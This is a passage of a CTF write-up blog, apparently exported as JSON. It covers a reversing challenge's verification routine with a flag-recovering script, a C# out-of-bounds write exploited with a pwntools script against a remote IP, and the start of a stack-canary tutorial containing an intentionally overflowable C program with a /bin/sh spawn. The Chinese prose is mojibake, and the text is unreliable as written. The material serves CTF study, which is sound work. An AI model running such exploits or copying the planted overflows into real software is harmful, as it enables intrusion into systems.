ds:[ecx-19092685] ; 3e668b8133abdcfe\n0000000000006105: (                   ): mov bx, word ptr ds:[ecx] ; 3e668b19\n0000000000006109: (                   ): cmp ax, bx                ; 6639d8\n000000000000610c: (                   ): jz .+1 (0x0000610f)       ; 7401\n000000000000610e: (                   ): inc edx                   ; 42\n000000000000610f: (                   ): shr ecx, 0x01             ; d1e9\n0000000000006111: (                   ): inc ecx                   ; 41\n0000000000006112: (                   ): jmp .-30 (0x000060f6)     ; ebe2\n0000000000006114: (                   ): cmp edx, 0x00000000       ; 83fa00\n0000000000006117: (                   ): jnz .+98 (0x0000617b)     ; 7562\n0000000000006119: (                   ): mov byte ptr gs:0x00000320, 0x41 ; 65c6052003000041\n0000000000006121: (                   ): mov byte ptr gs:0x00000321, 0x02 ; 65c6052103000002\n0000000000006129: (                   ): mov byte ptr gs:0x00000322, 0x63 ; 65c6052203000063\n0000000000006131: (                   ): mov byte ptr gs:0x00000323, 0x02 ; 65c6052303000002\n0000000000006139: (                   ): mov byte ptr gs:0x00000324, 0x63 ; 65c6052403000063\n0000000000006141: (                   ): mov byte ptr gs:0x00000325, 0x02 ; 65c6052503000002\n0000000000006149: (                   ): mov byte ptr gs:0x00000326, 0x65 ; 65c6052603000065\n0000000000006151: (                   ): mov byte ptr gs:0x00000327, 0x02 ; 65c6052703000002\n0000000000006159: (                   ): mov byte ptr gs:0x00000328, 0x73 ; 65c6052803000073\n0000000000006161: (                   ): mov byte ptr gs:0x00000329, 0x02 ; 65c605290300000\n0000000000006169: (                   ): mov byte ptr gs:0x0000032a, 0x73 ; 65c6052a03000073\n0000000000006171: (                   ): mov byte ptr gs:0x0000032b, 0x02 ; 65c6052b03000002\n0000000000006179: (                   ): jmp .+64 (0x000061bb)     ; eb40\n000000000000617b: (                   ): mov byte ptr gs:0x00000320, 0x46 ; 65c6052003000046\n0000000000006183: (                   ): mov byte ptr gs:0x00000321, 0x04 ; 65c6052103000004\n000000000000618b: (                   ): mov byte ptr gs:0x00000322, 0x61 ; 65c6052203000061\n0000000000006193: (                   ): mov byte ptr gs:0x00000323, 0x04 ; 65c6052303000004\n000000000000619b: (                   ): mov byte ptr gs:0x00000324, 0x69 ; 65c6052403000069\n00000000000061a3: (                   ): mov byte ptr gs:0x00000325, 0x04 ; 65c6052503000004\n00000000000061ab: (                   ): mov byte ptr gs:0x00000326, 0x6c ; 65c605260300006c\n00000000000061b3: (                   ): mov byte ptr gs:0x00000327, 0x04 ; 65c6052703000004\n00000000000061bb: (                   ): jmp .-2 (0x000061bb)      ; ebfe\n```\n\nä»£ç å¾ˆé•¿ï¼Œ\n\næœ€åçš„å…¨å±€æ®µå†…å­˜å¤„åˆ†åˆ«æ˜¯ACCESSå’ŒFAILï¼Œå³æ•°æ®æ ¡éªŒæˆåŠŸä¸å¦ã€‚\n\næ¥ç€åˆ†æä¸Šé¢ä»£ç å³å¯ï¼Œä¸€ç‚¹ä¸€ç‚¹åŠ¨è°ƒå¯ä»¥æ‘¸å‡ºå¤§ä½“é€»è¾‘ï¼š\n\nç¬¬ä¸€å±‚å¤§å¾ªç¯0x81/3æ¬¡ï¼Œå†…éƒ¨è¿›è¡Œ3æ¬¡å°å¾ªç¯ï¼ˆæ¯ä¸ªå¾ªç¯9æ¬¡ï¼‰ï¼Œå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†\n\n\n\n> EAXã€EBXï¼šç”¨äºä»å†…å­˜å–æ•°ï¼Œæˆ–è€…é€å…¥å†…å­˜\n>\n> ECX: è´Ÿè´£è®°æ•°ï¼Œæ¯æ‰§è¡Œå®Œæˆä¸€ä¸ªå°å¾ªç¯ï¼ˆ9æ¬¡ï¼‰ï¼Œinc ecx\n>\n> ESIã€EDIï¼šè´Ÿè´£ä½œä¸ºæ®µå†…åç§»æ¥å¯»å€ï¼ŒåŒæ—¶esiè¿˜ç”¨æ¥è®°å½•å°å¾ªç¯å†…éƒ¨çš„å¾ªç¯æ¬¡æ•°\n\nç”±äºç‚œå“¥åšå®¢å¾ˆè¯¦ç»†ï¼Œæ‰€ä»¥æˆ‘åªæä¸€ä¸‹ä¸€ä¸ªå›°æƒ‘æˆ‘å¾ˆé•¿æ—¶é—´çš„å†…å®¹â€”â€”å–å†…å­˜çš„é—®é¢˜\n\nä¸»è¦çœ‹è¿™ä¸¤æ¡æŒ‡ä»¤ï¼š\n\n```assembly\n mov eax, dword ptr ds:[esi]\n mov ebx, dword ptr ds:[edi]\n```\n\nesiï¼Œediçš„å€¼å†³å®šç€dsæ®µåŸºå€çš„åç§»ï¼Œ\n\n![image-20200805144842040](https://i.loli.net/2020/08/05/CHvORtU94N8hpKj.png)\n\né€šè¿‡åŠ¨è°ƒå¯ä»¥å‘ç°ebxæ€»æ˜¯å–åˆ°çš„eaxåå››ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä½†æ˜¯diåˆ°äº†0x20ä¹‹åä¼šè¢«é‡æ–°å½’é›¶\n\n![](https://i.loli.net/2020/08/05/PkWFHLha5jui8gU.png)\n\næ‰€ä»¥å¯ä»¥çœ‹å‡ºdsæ®µæ•°æ®çš„åœ°å€èŒƒå›´æ˜¯0x00-0x20ï¼Œå³36ä¸ªå­—èŠ‚ï¼Œæ­£å¥½ä¸flagçš„å­—èŠ‚æ•°ä¸€è‡´ã€‚\n\nç»§ç»­åŠ¨è°ƒåœ¨å…³é”®çš„å‡ ä¸ªæŒ‡ä»¤å¤„ä½ ä¼šå‘ç°\n\n![](https://i.loli.net/2020/08/05/NAhVnGqvsJaE7e3.png)\n\nä¹Ÿå°±æ˜¯è¯´å¯¹äºæ¯ä¸€æ¬¡åŠ å¯†ï¼ŒåŠ å¯†åçš„æ•°æ®ä¼šè¦†ç›–åˆ°åŸæœ¬æ•°æ®çš„ä½ç½®ã€‚\n\nå¦‚ï¼šåŸæ•°æ®ï¼š1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5\n\nã€€ã€€ç¬¬ä¸€æ¬¡ï¼šå–å‡º1ï¼Œ2è¿›è¡ŒåŠ å¯†ï¼ŒåŠ å¯†å¾—3ï¼Œåˆ™è¦†ç›–åˆ°åŸæœ¬1çš„ä½ç½®ï¼Œç°åœ¨çš„å†…å­˜ä¸º3ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5\n\nã€€ã€€ç¬¬äºŒæ¬¡ï¼šå†å–å‡º2ï¼Œ3è¿›è¡ŒåŠ å¯†ï¼ŒåŠ å¯†å¾—5ï¼Œåˆ™å†…å­˜å˜ä¸ºï¼š3ï¼Œ5ï¼Œ3ï¼Œ4ï¼Œ5\n\nã€€ã€€ä»¥æ­¤ç±»æ¨ï¼ŒåŠ å¯†0x81Ã—9æ¬¡\n\n\n\nç°åœ¨ææ‡‚äº†åŠ å¯†è§„åˆ™ï¼Œå†æ¥çœ‹æ ¡éªŒçš„æ­¥éª¤\n\n```assembly\n00000000000060f2: (): xor ecx, ecx             \n00000000000060f4: (): xor edx, edx            \n00000000000060f6: (): cmp ecx, 0x00000012       //å¾ªç¯0x12æ¬¡ï¼Œå³åè¿›åˆ¶18æ¬¡\n00000000000060f9: (): jz .+25 (0x00006114)     //å¦‚æœæ»¡0x12æ¬¡ï¼Œç›´æ¥è·³è½¬åˆ¤æ–­edxçš„å€¼\n00000000000060fb: (): shl ecx, 0x01             //ecxå·¦ç§»ä¸€ä½ï¼Œç›¸å½“äºä¹˜2\n00000000000060fd: (): mov ax, word ptr ds:[ecx-19092685]//å–æ ¡éªŒæ•°æ®ï¼Œä½16ä½æ”¾å…¥ax\n0000000000006105: ( ): mov bx, word ptr ds:[ecx]//å†…å­˜å¤„å–åŠ å¯†è¿‡çš„æ•°æ®ï¼Œä½16ä½æ”¾å…¥bx\n0000000000006109: (): cmp ax, bx               //æ¯”è¾ƒï¼Œå¦‚æœä¸ç›¸ç­‰edx+1\n000000000000610c: (): jz .+1 (0x0000610f)    \n000000000000610e: (): inc edx               \n000000000000610f: (): shr ecx, 0x01          //ecxå³ç§»1ä½ï¼Œç›¸å½“äºé™¤ä»¥2\n0000000000006111: (): inc ecx                //ecxåŠ 1\n0000000000006112: (): jmp .-30 (0x000060f6)   //è·³è½¬æ¯”è¾ƒecxå’Œ0x12çš„å¤§å°\n0000000000006114: (): cmp edx, 0x00000000      //å¦‚æœedxä¸ç­‰äº0ï¼Œåˆ™å¤±è´¥\n0000000000006117: (): jnz .+98 (0x0000617b)    \n```\n\nåœ¨0x0006109å¤„ä¸‹æ–­ç‚¹ï¼Œç„¶ååŠ¨è°ƒä¸€ä¸‹è§‚å¯Ÿecxå¦‚ä½•å˜åŒ–\n\n![](https://i.loli.net/2020/08/05/9dzXOYig1WmrEJL.png)\n\n![](https://i.loli.net/2020/08/05/nRQHUTb6AIOPVWG.png)\n\n![](https://i.loli.net/2020/08/05/E2LPbZ5q68ltArf.png)\n\nå¯ä»¥çœ‹åˆ°æ¯æ¬¡å–æ•°æ®æ—¶ï¼Œecxåç§»åŠ 2\n\nä¸€å¼€å§‹ç”±äºaxå’Œeaxç­‰å¯„å­˜å™¨çš„è¯¯å¯¼ï¼Œå®åœ¨æ²¡æƒ³é€šè¿™ä¸€å—ä»£ç \n\nç°åœ¨çŸ¥é“ä¸¤è€…å·®åˆ«åç»ˆäºææ‡‚äº†....\n\n> åŠ å¯†æ—¶ï¼Œä¸€æ¬¡å–4ä¸ªå­—èŠ‚ï¼Œå¾ªç¯9æ¬¡ï¼Œå³36ä¸ªå­—èŠ‚ï¼Œå†…å­˜åŒºåŸŸds:[0x0]-ds:[0x20]ã€‚\n>\n> æ ¡éªŒæ—¶ï¼Œä¸€æ¬¡å–2ä¸ªå­—èŠ‚ï¼Œå¾ªç¯18æ¬¡ï¼Œä¹Ÿæ˜¯36ä¸ªå­—èŠ‚ï¼Œå†…å­˜åŒºåŸŸç›¸åŒã€‚\n\næ‰€ä»¥ï¼Œå…¨éƒ¨æ˜ç™½ä¹‹åï¼Œé¢˜ç›®å°±è¿åˆƒè€Œè§£äº†ã€‚\n\nè‡³äºåŠ å¯†æ–¹æ³•æ˜¯ä¸‰ä¸ªæ•°æ®å¼‚æˆ–ï¼Œè¿™æ˜¯æˆ‘æ²¡æœ‰æƒ³åˆ°çš„...\n\næ”¾ä¸Šä¸Š**å®˜æ–¹exp**\n\n```python\nenc_flag = [0xec5574d8,0x421a04b5,0x2ba6d11,0x8105055f,0xeda06c28,0x6ae00499,0x18a955e7,0x71d63591,0x4537a864]\nfor n in range(128,-1,-1):               #129è½®é€»è¾‘è¿ç®—\n    for i in range(8,-1,-1):           #è‡­æ­»åŠ›\n        if (n%3 == 0):\n            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x24114514\n        elif(n%3 == 1):\n            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x1919810\n        elif(n%3 == 2):\n            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x19260817\ngroup = [None] * (len(enc_flag) * 4) #36å­—èŠ‚\nfor i in range(9):\n    for n in range(4):\n        group[i*4+n] = (enc_flag[i]>>(8*n))&0xff\nfor i in range(len(group)):#å‡¯æ’’è§£å¯†\n    group[i] = (group[i] - 0x55)%0x100\n\nflag = [None] * len(group)\nfor i in range(6):#è¡Œåˆ—å¯†ç è§£å¯†\n    for n in range(6):\n        flag[i*6+n] = group[n*6+i]\nkey_board_mapping = {0x2:'1',0x3:'2',0x4:'3',0x5:'4',0x6:'5',0x7:'6',0x8:'7',0x9:'8',0xa:'9',0xb:'0',0xc:'_',0xd:'+',0x10:'q',0x11:'w',0x12:'e',0x13:'r',0x14:'t',0x15:'y',0x16:'u',0x17:'i',0x18:'o',0x19:'p',0x1a:'{',0x1b:'}',0x1e:'a',0x1f:'s',0x20:'d',0x21:'f',0x22:'g',0x23:'h',0x24:'j',0x25:'k',0x26:'l',0x2c:'z',0x2d:'x',0x2e:'c',0x2f:'v',0x30:'b',0x31:'n',0x32:'m',0x39:' ',}\nfor i in range(len(flag)):#é”®ç›˜æ˜ å°„å›å»\n    if flag[i]>0x39:\n        flag[i] -= 0x30\n        flag[i] = key_board_mapping[flag[i]].upper()\n    else:\n        flag[i] = key_board_mapping[flag[i]]\nfor i in flag:\n    print(i,end = '')\n    \n#WMCTF{D0_Y0u_kn0w_th3_Pr0t3ct3dM0d3}\n#ä¹Ÿå¯ä»¥è§£å‡ºæ•°åæŒ‰ç…§æ•°ç»„æ‰‹åŠ¨è¿˜åŸ\n```\n\n------\n\n# 0x04 mengyedekending\n\nä¸€é“windows pwnï¼Œç”¨C#å†™çš„ï¼Œç¬¬ä¸€æ¬¡åšï¼Œä»£ç å¥½ä¸å®¹æ˜“æ‰çœ‹æ‡‚ï¼Œå¤ªèœäº†å¤ªèœäº†...\n\næ‹¿è¿‡é¢˜æ¥æ˜¯è¿™äº›ä¸œè¥¿\n\n![](https://i.loli.net/2020/08/06/3qGKAzEmVytMucQ.png)\n\nç”¨IDAæ‰“å¼€baby_Cat.exeå¾ˆä¹±æ‰¾ä¸åˆ°æœ‰ç”¨çš„å‡½æ•°ï¼Œä½†æœ‰å¾ˆå¤šç±»ä¼¼çš„å­—ç¬¦ä¸²ä¿¡æ¯\n\n![](https://i.loli.net/2020/08/29/JrjSYVqvFPBATkR.png)\n\nå¯ä»¥çŒœæµ‹å‡ºè¿™ä¸ªexeå®é™…ä¸Šæ˜¯åœ¨åŠ è½½dllï¼Œç¨‹åºä¸»è¦çš„é€»è¾‘å°±åœ¨åŠ è½½çš„dllä¸­æ‰§è¡Œã€‚\n\næ‰¾åˆ°ä¸»å‡½æ•°ï¼Œåˆ†æä»£ç ï¼š\n\n```c\nprivate unsafe static void Main(string[] args)\n\t\t{\n\t\t\tchar* ptr = stackalloc char[(UIntPtr)100]; //å¼€è¾Ÿ100å¤§å°çš„ç©ºé—´\n\t\t\tint num = 1;\n\t\t\tint* ptr2 = (int*)(ptr + 50);    // ptr2æŒ‡å‘ptråç§»50çš„ä½ç½®\n\t\t\tProgram @object = new Program();\n\t\t\tProgram.MsgHandler msgHandler = new Program.MsgHandler(@object.Right);\n\t\t\tProgram.MsgHandler msgHandler2 = new Program.MsgHandler(@object.Backdoor);//  backdoor\n\t\t\tConsole.WriteLine(\"This is a gift for you : {0:x4}\", &num);//è¾“å‡ºnumçš„åœ°å€\n\t\t\tConsole.WriteLine(\"What do you want me to repeat?\");\n\t\t\tptr2[1] = 0;  //è®°å½•è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°\n\t\t\tptr2[2] = ptr; //æŒ‡å‘ptr\n\t\t\t*ptr2 = 0; //å³ptr[50] = 0\n\t\t\twhile (ptr2[1] < 53)\n\t\t\t{\n\t\t\t\tchar c = (char)Console.Read(); //è¯»å…¥å­—ç¬¦\n\t\t\t\tbool flag = c == '\\n'; //è‹¥æ¢è¡Œç¬¦åˆ™è·³å‡º\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tbool flag2 = c == '\\r';//è‹¥ä¸æ˜¯å›è½¦åˆ™è¿›å…¥å¾ªç¯\n\t\t\t\tif (!flag2)\n\t\t\t\t{\n\t\t\t\t\tptr[*ptr2] = c;//å°†å­—ç¬¦å†™å…¥\n\t\t\t\t\tptr2[1]++;\n\t\t\t\t}\n\t\t\t\t(*ptr2)++;//åç§»é‡+1\n\t\t\t}\n\t\t\tConsole.WriteLine(\"Do you want to change your input?\");\n\t\t\tchar c2 = (char)Console.Read();\n\t\t\tbool flag3 = c2 == 'N' || c2 == 'n';\n\t\t\tif (flag3)\n\t\t\t{\n\t\t\t\tmsgHandler(ptr);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"Please tell me a offset!\");\n\t\t\t\tchar* ptr3 = ptr2[2];\n\t\t\t\tConsole.ReadLine();\n\t\t\t\tint num2 = Console.Read();\n\t\t\t\tfor (int i = 0; i < num2; i++)\n\t\t\t\t{\n\t\t\t\t\tchar* ptr4 = ptr3 + i;\n\t\t\t\t\t*ptr4 -= '\\u0001'; //å¯¹å†…å­˜çš„æ•°â€”1\n\t\t\t\t}\n\t\t\t\tbool flag4 = num == 1;\n\t\t\t\tif (flag4)\n\t\t\t\t{\n\t\t\t\t\tmsgHandler(ptr);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tmsgHandler2(ptr);        //åé—¨å‡½æ•°\n\t\t\t\t}\n\t\t\t}\n\t\t}\n```\n\nåé—¨å‡½æ•°é•¿è¿™æ ·:\n\n![](https://i.loli.net/2020/08/06/Op35ZHshlN1tk86.png)\n\nåˆ†æå®Œæ¯•ï¼Œç›®æ ‡å°±æ˜¯ä»¤num==0ï¼Œç»•è¿‡å»æ‰§è¡Œè¿™ä¸ªåé—¨å‡½æ•°\n\nç¨‹åºå…³é”®ç‚¹åœ¨è¿™ï¼š\n\n![](https://i.loli.net/2020/08/06/S2mAMz3L9WFnKhZ.png)\n\n`ptr[*ptr2]`å­˜æ”¾ç€æˆ‘ä»¬çš„è¾“å…¥cï¼Œè€Œ\\*ptr2æŒ‡å‘äº†ptr+50çš„ä½ç½®ï¼Œè¿™ä¸ªä½ç½®çš„å€¼åˆå§‹åŒ–ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„è¾“å…¥æ”¾åœ¨ptr[0]çš„ä½ç½®ï¼Œæ¥ç€\\*ptr2++ï¼Œä½¿å¾—è¾“å…¥é€æ¸åç§»ã€‚ï¼ˆå•Šï¼ä¸‡æ¶çš„æŒ‡é’ˆï¼‰\n\nè€Œç¨‹åºæ²¡æœ‰å¯¹æ•°ç»„è¾¹ç•Œè¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥å­˜åœ¨æ•°ç»„è¶Šç•Œæ¼æ´\n\nç›®æ ‡ä¹Ÿå¾ˆæ¸…æ¥šäº†ï¼Œç”±äºç¨‹åºç¬¬ä¸€ä¸ªè¾“å‡ºå‘Šè¯‰äº†æˆ‘ä»¬numçš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾åˆ°numå’Œè¾“å…¥çš„åç§»ï¼Œæ›´æ”¹*ptr2çš„å€¼ï¼Œä½¿å…¶æŒ‡å‘&num-1çš„ä½ç½®ï¼Œä¸‹ä¸€æ¬¡å°±å¯ä»¥è¦†ç›–åˆ°num==0äº†ï¼Œè¿›è€Œæ‰§è¡Œbackdoor\n\ndnspyåŠ¨æ€è°ƒè¯•ï¼Œ\n\n![](https://i.loli.net/2020/08/06/dyKL8Ef6NPCmHut.png)\n\næ‰€ä»¥å¯ä»¥è®¡ç®—åç§»é‡ï¼š(0x02CFF000-0x02CFEF29)/2 = 0x6B  ï¼ˆC#ä½¿ç”¨çš„å®½å­—èŠ‚ï¼‰\n\nå› æ­¤è¦†ç›–ptr[50] ==0x6bï¼Œä¸‹ä¸€æ¬¡è¦†ç›–num=='\\x00'\n\n## 0x05 exp\n\n```python\nfrom pwn import *\np = remote('111.73.46.229', 51000)\ncontext.log_level = 'debug'\npayload = \"A\" * 50 + chr(0x6b) + '\\x00'\np.sendline(payload)\np.recv()\np.sendline('y')\np.recv()\np.sendline('1 hail ld1ng!')#åŠ¨è°ƒå‘ç°å½“é¦–å­—ç¬¦ascii<83æ—¶æœ‰æ•ˆï¼ŒåŸå› åœ¨äºæœ€åçš„å¾ªç¯\n#p.sendline('\\x00')#æˆ–è€… send 0 ç›´æ¥è·³å‡ºæœ€åä¸€ä¸ªå¾ªç¯\np.interactive()\n```\n\n![](https://i.loli.net/2020/08/06/EfSHcGaAC6TvqNP.png)\n\næˆåŠŸ~\n\n# 0x06 å°ç»“\n\n**WMware**çš„å‡ºé¢˜äººæ˜¯é­”é¬¼ï¼Œå…¨ç¨‹è€ƒå¯Ÿæ±‡ç¼–èƒ½åŠ›ï¼Œå¥½å¤šéƒ½æ˜¯å¾®æœºåŸç†å­¦è¿‡çš„å†…å®¹ï¼ˆå…¨å¿˜å¹²å‡€äº†ï¼‰ï¼Œè¶æ­¤æœºä¼šå¤ä¹ ä¸€ä¸‹å§ã€‚\n\nä¸è¿‡çœ‹å¤§ç¥ä»¬è¯´å¯ä»¥ç”¨IDAï¼Ÿæˆ‘çš„IDAå¯èƒ½æœ‰è‡ªå·±çš„æƒ³æ³•ï¼Œè¿˜æ˜¯ç®—äº†...\n\n**mengyedekending**çœ‹ä¸Šå»ä¸éš¾ï¼Œè¿™é¢˜æ¯”èµ›æœ‰35è§£\n\nä½†æ˜¯ç¬¬ä¸€æ¬¡åšè¿™ç§ç±»å‹çš„é¢˜è¿˜æ˜¯å¾ˆéš¾å—çš„ï¼Œç‰¹åˆ«æ˜¯æŒ‡é’ˆçš„é—®é¢˜ï¼Œåœ¨pwnä¸­æ˜¯é‡ç‚¹ï¼Œå¿…é¡»å¥½å¥½æŒæ¡\n\nè¿™æ¬¡æ¯”èµ›è¿˜æ˜¯æœ‰æ”¶è·çš„ï¼Œå™¶æ²¹ï¼","tags":["CTF","wp","ADWorld"],"categories":["REVERSE"]},{"title":"å­¦ä¹ canary&&æ ˆè¿ç§»","url":"/2020/07/01/canary/","content":"\n# 0x00 å‰è¨€\n\nåˆšå¼€å§‹æ¥è§¦canaryï¼Œå…ˆä¸è°ˆé¢˜ç›®ä¸­å¦‚ä½•åˆ©ç”¨ï¼Œåªè®°ä¸€ä¸‹æˆ‘å¯¹å®ƒæµ…æ˜¾çš„ç†è§£\n\n------\n\n2020.7.3\n\nå›å¤´çœ‹äº†ä¸€éç¬¬äº”ç©ºé—´çš„pwné¢˜(twice)ï¼Œç”¨äº†canaryå’Œæ ˆè¿ç§»çš„çŸ¥è¯†ï¼Œæ­£å¥½æ•´åˆåœ¨ä¸€èµ·\n\nå­¦äº†å¾ˆé•¿æ—¶é—´ï¼Œç»ˆäºææ‡‚äº†ï¼Œæœ€è¿‘æœ‰è€ƒè¯•ï¼Œç­‰è€ƒå®Œè¯¦ç»†è®°å½•ä¸€ä¸‹ã€‚\n\n------\n\n2020.7.16\n\nç»ˆäºè€ƒå®Œè¯•å¤ç°ä¸€ä¸‹è¿™é“é¢˜ï¼Œä¸­é€”ç”µè„‘åäº†æ‹¿å»ä¿®ï¼Œä¸è¿‡è¿˜å¥½ç›˜æ²¡åï¼Œä»€ä¹ˆéƒ½æ²¡ä¸¢ï¼Œä¸‡å¹¸ä¸‡å¹¸~\n\n# 0x01 canary\n\nä»€ä¹ˆæ˜¯canaryå‘¢ï¼Ÿ\n\nCanary çš„æœ¬æ„æ˜¯é‡‘ä¸é›€ï¼Œæ¥æºäºè‹±å›½çŸ¿äº•å·¥äººç”¨æ¥æ¢æŸ¥äº•ä¸‹æ°”ä½“æ˜¯å¦æœ‰æ¯’çš„é‡‘ä¸é›€ç¬¼å­ã€‚å·¥äººä»¬æ¯æ¬¡ä¸‹äº•éƒ½ä¼šå¸¦ä¸Šä¸€åªé‡‘ä¸é›€ã€‚å¦‚æœäº•ä¸‹çš„æ°”ä½“æœ‰æ¯’ï¼Œé‡‘ä¸é›€ç”±äºå¯¹æ¯’æ€§æ•æ„Ÿå°±ä¼šåœæ­¢é¸£å«ç”šè‡³æ­»äº¡ï¼Œä»è€Œä½¿å·¥äººä»¬å¾—åˆ°é¢„è­¦ã€‚ \n\nè¿™é‡Œçš„canaryä¹Ÿå…·æœ‰ç›¸ä¼¼çš„åŠŸèƒ½ï¼Œæ”¾åœ¨æ ˆåº•ç”¨äºæ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡ºï¼Œå®ƒçš„å‡ºç°å¾ˆå¤§ç¨‹åº¦ä¸Šå¢åŠ äº†æ ˆæº¢å‡ºæ”»å‡»çš„éš¾åº¦ï¼Œå¹¶ä¸”ç”±äºå®ƒå‡ ä¹å¹¶ä¸æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥ç°åœ¨æˆäº† Linux ä¸‹ä¿æŠ¤æœºåˆ¶çš„æ ‡é…ã€‚\n\n------\n\n## 0x02 åŸç†\n\nx86æ ˆç»“æ„ï¼š\n\n![image-20200701172055740](https://i.loli.net/2020/07/01/OPEoZQd7nupaBj8.png)\n\nä¸»è¦è¯´ä¸€ä¸‹x86ä¸‹çš„canaryï¼Œx64ç±»ä¼¼\n\næ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®© shellcode èƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚\n\nå½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆåº•æ’å…¥ cookie ä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯ cookie ä¿¡æ¯æ˜¯å¦åˆæ³• (æ ˆå¸§é”€æ¯å‰æµ‹è¯•è¯¥å€¼æ˜¯å¦è¢«æ”¹å˜)ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œ (æ ˆæº¢å‡ºå‘ç”Ÿ)ã€‚\n\næ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°† cookie ä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢ shellcode çš„æ‰§è¡Œï¼Œé¿å…æ¼æ´åˆ©ç”¨æˆåŠŸã€‚\n\n## 0x03 leak canary\n\nä¹‹å‰æœ‰ä¸ªé¢˜ç›®æ¯”è¾ƒç®€å•[Mary_Morton](http://ld1ng.com/2020/06/03/ADWorld-pwn/#0x04-Mary-Morton)ï¼Œå­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„éœ²canaryçš„å€¼\n\nè¿™é‡Œè®²ä¸€ä¸‹å¦å¤–ä¸€ç§æ–¹æ³•\n\nä¸ºäº†ä¾¿äºç†è§£ï¼Œå†™ä¸€ä¸ªç®€å•çš„ç¨‹åºè‡ªå·±è°ƒä¸€ä¸‹\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\nvoid getshell(void) {\n    system(\"/bin/sh\");\n}\nvoid init() {\n    setbuf(stdin, NULL);\n    setbuf(stdout, NULL);\n    setbuf(stderr, NULL);\n}\nvoid vuln() {\n    char buf[100];\n    for(int i=0;i<2;i++){\n        read(0, buf, 0x200);\n        puts(buf);\n    }\n}\nint main(void) {\n    init();\n    puts(\"Hello Hacker!\");\n    vuln();\n    return 0;\n}\n```\n\n```shell\ngcc -m32 -no-pie canary.c -o canary //æ— PIEä¿æŠ¤\n```\n\nç¼–è¯‘ä¹‹åå¯ä»¥è¿è¡Œï¼Œè¾“å…¥ä¸¤æ¬¡æ•°æ®ç»“æŸ\n\nèŒä¸šç—…ï¼Œæ‹–è¿›IDA\n\n![image-20200701162154035](https://i.loli.net/2020/07/01/O7kHLestKch9dTE.png)\n\nä¸»è¦çœ‹ä¸€ä¸‹vulnå‡½æ•°ï¼Œ`buf`æ˜¯æˆ‘ä»¬å¼€è¾Ÿçš„ç¼“å†²åŒºï¼Œå¤§å°70Hï¼ˆåè¿›åˆ¶112ï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬åªå®šä¹‰äº†100ä¸ªå¤§å°ï¼Œä¸ºä»€ä¹ˆä¼šå¤š12å­—èŠ‚çš„å¤§å°å‘¢\n\nç„¶åv3å¾ˆå¥‡æ€ªï¼Œæºç ä¸­å¹¶æ²¡æœ‰å®šä¹‰è¿™ä¸ªå˜é‡ï¼Œçœ‹åˆ°æœ€åreturnï¼Œè‡ªå·±å’Œè‡ªå·±å¼‚æˆ–ï¼Œå¾ˆæ˜æ˜¾åšäº†ä¸€æ¬¡æ£€æŸ¥ï¼Œåªæœ‰ä¸¤æ¬¡ç›¸ç­‰æ—¶æ‰èƒ½return 0ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“v3å°±æ˜¯canary\n\nå†çœ‹v3åœ¨æ ˆä¸­çš„ä½ç½®`ebp-C`æ­£å¥½ç¬¦åˆæ¡ä»¶ã€‚\n\nå³è¾“å…¥100ä¸ªå­—ç¬¦ä¹‹åå°±æ˜¯canary\n\nä¸ºäº†è¿›ä¸€æ­¥ææ¸…æ¥šæ³„éœ²canaryçš„åŸç†ï¼Œå¯ä»¥gdbè°ƒè¯•ä¸€ä¸‹\n\n![image-20200701163648373](https://i.loli.net/2020/07/01/Bx4Ld7kSaJ3EGHl.png)\n\nå·¦é¢æ˜¯è¾“å…¥äº†99ä¸ª'A'ï¼Œå³é¢è¾“å…¥100ä¸ª'A'ï¼Œå¯ä»¥æ˜æ˜¾çœ‹å‡ºæˆ‘ç”»çº¢çº¿ä½ç½®çš„ä¸åŒï¼Œå…¶ä¸­0x0aæ˜¯100ä¸ªAä¹‹åçš„æ¢è¡Œç¬¦ï¼Œè€Œbufå¤§å°åˆšå¥½æ˜¯100\n\n- å½“è¾“å…¥99ä¸ªAæ—¶ï¼ŒåŠ ä¸Š0x0açš„æ¢è¡Œæ 